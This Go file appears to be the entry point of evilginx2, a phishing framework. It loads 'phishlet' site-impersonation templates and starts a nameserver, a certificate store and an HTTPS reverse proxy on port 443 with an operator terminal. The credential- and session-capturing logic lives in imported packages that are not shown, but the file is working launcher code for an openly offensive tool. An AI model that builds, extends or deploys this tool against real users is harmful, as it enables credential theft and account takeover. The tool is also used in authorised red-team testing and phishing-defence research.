package main

import (
	"flag"
	"io/ioutil"
	"os"
	"os/user"
	"path/filepath"
	"regexp"

	"github.com/kgretzky/evilginx2/core"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

var (
	phishlets_dir  = flag.String("p", "", "Phishlets directory path")
	templates_dir  = flag.String("t", "", "HTML templates directory path")
	debug_log      = flag.Bool("debug", false, "Enable debug output")
	developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
	cfg_dir        = flag.String("c", "", "Configuration directory path")
)

func joinPath(base_path string, rel_path string) string {
	var ret string
	if filepath.IsAbs(rel_path) {
		ret = rel_path
	} else {
		ret = filepath.Join(base_path, rel_path)
	}
	return ret
}

func main() {
	flag.Parse()
	Start(false, *phishlets_dir, *debug_log, *developer_mode, *cfg_dir, *templates_dir)
}

func Start(run_background bool, phishlets_path string, debug bool, dev bool, config_path string, template_path string) *core.Terminal {
	exe_path, _ := os.Executable()
	exe_dir := filepath.Dir(exe_path)

	core.Banner()
	flag.Parse()
	if phishlets_path == "" {
		phishlets_path = joinPath(exe_dir, "./phishlets")
		if _, err := os.Stat(phishlets_path); os.IsNotExist(err) {
			phishlets_path = "/usr/share/evilginx/phishlets/"
			if _, err := os.Stat(phishlets_path); os.IsNotExist(err) {
				log.Fatal("You need to provide the path to directory where your phishlets are stored: ./evilginx -p <phishlets_path>")
				return nil
			}
		}
	}
	if template_path == "" {
		template_path = joinPath(exe_dir, "./templates")
		if _, err := os.Stat(template_path); os.IsNotExist(err) {
			template_path = "/usr/share/evilginx/templates/"
			if _, err := os.Stat(template_path); os.IsNotExist(err) {
				template_path = joinPath(exe_dir, "./templates")
			}
		}
	}
	if _, err := os.Stat(phishlets_path); os.IsNotExist(err) {
		log.Fatal("Provided phishlets directory path does not exist: %s", phishlets_path)
		return nil
	}
	if _, err := os.Stat(template_path); os.IsNotExist(err) {
		os.MkdirAll(template_path, os.FileMode(0700))
	}

	log.DebugEnable(debug)
	if debug {
		log.Info("debug output enabled")
	}

	log.Info("loading phishlets from: %s", phishlets_path)

	if config_path == "" {
		usr, err := user.Current()
		if err != nil {
			log.Fatal("%v", err)
			return nil
		}
		config_path = filepath.Join(usr.HomeDir, ".evilginx")
	}

	log.Info("loading configuration from: %s", config_path)

	err := os.MkdirAll(config_path, os.FileMode(0700))
	if err != nil {
		log.Fatal("%v", err)
		return nil
	}

	crt_path := joinPath(config_path, "./crt")

	if err := core.CreateDir(crt_path, 0700); err != nil {
		log.Fatal("mkdir: %v", err)
		return nil
	}

	cfg, err := core.NewConfig(config_path, "")
	if err != nil {
		log.Fatal("config: %v", err)
		return nil
	}
	cfg.SetTemplatesDir(template_path)

	db, err := database.NewDatabase(filepath.Join(config_path, "data.db"))
	if err != nil {
		log.Fatal("database: %v", err)
		return nil
	}

	bl, err := core.NewBlacklist(filepath.Join(config_path, "blacklist.txt"))
	if err != nil {
		log.Error("blacklist: %s", err)
		return nil
	}

	files, err := ioutil.ReadDir(phishlets_path)
	if err != nil {
		log.Fatal("failed to list phishlets directory '%s': %v", phishlets_path, err)
		return nil
	}
	for _, f := range files {
		if !f.IsDir() {
			pr := regexp.MustCompile(`([a-zA-Z0-9\-\.]*)\.yaml`)
			rpname := pr.FindStringSubmatch(f.Name())
			if rpname == nil || len(rpname) < 2 {
				continue
			}
			pname := rpname[1]
			if pname != "" {
				pl, err := core.NewPhishlet(pname, filepath.Join(phishlets_path, f.Name()), cfg)
				if err != nil {
					log.Error("failed to load phishlet '%s': %v", f.Name(), err)
					continue
				}
				//log.Info("loaded phishlet '%s' made by %s from '%s'", pl.Name, pl.Author, f.Name())
				cfg.AddPhishlet(pname, pl)
			}
		}
	}

	ns, _ := core.NewNameserver(cfg)
	ns.Start()
	hs, _ := core.NewHttpServer()
	hs.Start()

	crt_db, err := core.NewCertDb(crt_path, cfg, ns, hs)
	if err != nil {
		log.Fatal("certdb: %v", err)
		return nil
	}

	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, dev)
	hp.Start()

	t, err := core.NewTerminal(hp, cfg, crt_db, db, dev)
	if err != nil {
		log.Fatal("%v", err)
		return nil
	}

	t.DoWork(run_background)
	return t
}
